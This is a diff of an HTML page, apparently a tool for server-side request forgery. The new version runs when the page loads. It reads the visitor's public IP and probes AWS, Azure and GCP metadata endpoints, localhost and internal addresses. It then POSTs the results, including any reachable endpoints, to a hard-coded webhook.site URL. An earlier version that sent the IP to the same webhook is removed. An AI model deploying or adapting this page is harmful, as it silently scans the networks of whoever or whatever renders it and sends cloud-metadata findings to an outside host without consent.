@@ -3,27 +3,129 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SSRF Testing</title>
-    <script>
-        async function detectHostname() {
-            // Example function to demonstrate SSRF functionality
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            const hostname = data.ip;
-            document.getElementById('result').innerText = `Detected Hostname: ${hostname}`;
-
-            // Webhook integration
-            await fetch('https://webhook.site/4eb0eaf7-b3a6-47d2-85c8-c47759291f94', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({hostname: hostname})
-            });
-        }
-    </script>
+    <title>SSRF Tester</title>
+    <style>
+        body { font-family: 'Courier New', monospace; background: #0d1117; color: #c9d1d9; padding: 20px; }
+        .container { max-width: 1000px; margin: 0 auto; background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 20px; }
+        h1 { color: #58a6ff; }
+        .log { background: #0d1117; border: 1px solid #30363d; border-radius: 4px; padding: 15px; margin: 15px 0; max-height: 600px; overflow-y: auto; font-size: 12px; }
+        .entry { margin: 5px 0; padding: 5px; border-left: 3px solid #30363d; padding-left: 10px; }
+        .vulnerable { border-left-color: #f85149; color: #f85149; }
+        .safe { border-left-color: #3fb950; color: #3fb950; }
+        .info { border-left-color: #58a6ff; color: #58a6ff; }
+        .webhook { border-left-color: #d29922; color: #d29922; }
+        .status { margin: 10px 0; padding: 10px; background: #0d1117; border: 1px solid #30363d; border-radius: 4px; }
+    </style>
 </head>
 <body>
-    <h1>SSRF Testing Page</h1>
-    <button onclick="detectHostname()">Detect Hostname</button>
-    <p id="result"></p>
+    <div class="container">
+        <h1>🌐 SSRF Tester - Auto Run</h1>
+        <div class="status">
+            <strong>IP Address:</strong> <span id="ip">Detecting...</span> | 
+            <strong>Status:</strong> <span id="status">Starting SSRF tests...</span>
+        </div>
+        <div id="log" class="log">Initializing SSRF tests...</div>
+    </div>
+
+    <script>
+        const webhookUrl = 'https://webhook.site/4eb0eaf7-b3a6-47d2-85c8-c47759291f94';
+        const ssrfPayloads = [
+            'http://169.254.169.254/metadata/instance',
+            'http://169.254.169.254/latest/meta-data/',
+            'http://metadata.azure.com/metadata/instance?api-version=2021-02-01',
+            'http://metadata.google.internal/computeMetadata/v1/',
+            'http://localhost:80/metadata',
+            'http://127.0.0.1:8080/admin',
+            'http://10.0.0.1:8080'
+        ];
+
+        function addLog(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const entry = `[${timestamp}] ${message}`;
+            
+            const logDiv = document.getElementById('log');
+            const entryEl = document.createElement('div');
+            entryEl.className = `entry ${type}`;
+            entryEl.textContent = entry;
+            logDiv.appendChild(entryEl);
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        async function sendToWebhook(data) {
+            try {
+                const payload = {
+                    timestamp: new Date().toISOString(),
+                    scanType: 'ssrf_scan',
+                    data: data
+                };
+                
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                addLog(`📨 Webhook Response: ${response.status} ${response.statusText}`, 'webhook');
+            } catch (error) {
+                addLog(`❌ Webhook Failed: ${error.message}`, 'safe');
+            }
+        }
+
+        async function runSSRFTest() {
+            // Get IP address
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                document.getElementById('ip').textContent = ipData.ip;
+                addLog(`🎯 IP: ${ipData.ip}`, 'info');
+            } catch (e) {
+                addLog(`⚠️ Could not detect IP`, 'info');
+            }
+
+            addLog(`🌐 Testing ${ssrfPayloads.length} SSRF payloads...`, 'info');
+            
+            let vulnerabilities = [];
+            let results = {};
+
+            for (const payload of ssrfPayloads) {
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 2000);
+                    
+                    const response = await fetch(payload, {
+                        method: 'GET',
+                        signal: controller.signal
+                    }).catch(() => null);
+                    
+                    clearTimeout(timeoutId);
+                    
+                    if (response && response.ok) {
+                        vulnerabilities.push(payload);
+                        results[payload] = 'VULNERABLE';
+                        addLog(`🚨 VULNERABLE: ${payload}`, 'vulnerable');
+                    } else {
+                        results[payload] = 'BLOCKED';
+                        addLog(`✅ Safe: ${payload}`, 'safe');
+                    }
+                } catch (error) {
+                    results[payload] = 'BLOCKED';
+                    addLog(`✅ Safe: ${payload}`, 'safe');
+                }
+            }
+
+            addLog(`\n🏁 Found ${vulnerabilities.length} vulnerabilities`, 'info');
+            
+            await sendToWebhook({
+                payloadsTested: ssrfPayloads.length,
+                vulnerabilitiesFound: vulnerabilities.length,
+                vulnerableEndpoints: vulnerabilities,
+                results: results
+            });
+
+            document.getElementById('status').textContent = 'Complete ✅';
+        }
+
+        window.addEventListener('load', runSSRFTest);
+    </script>
 </body>
 </html>
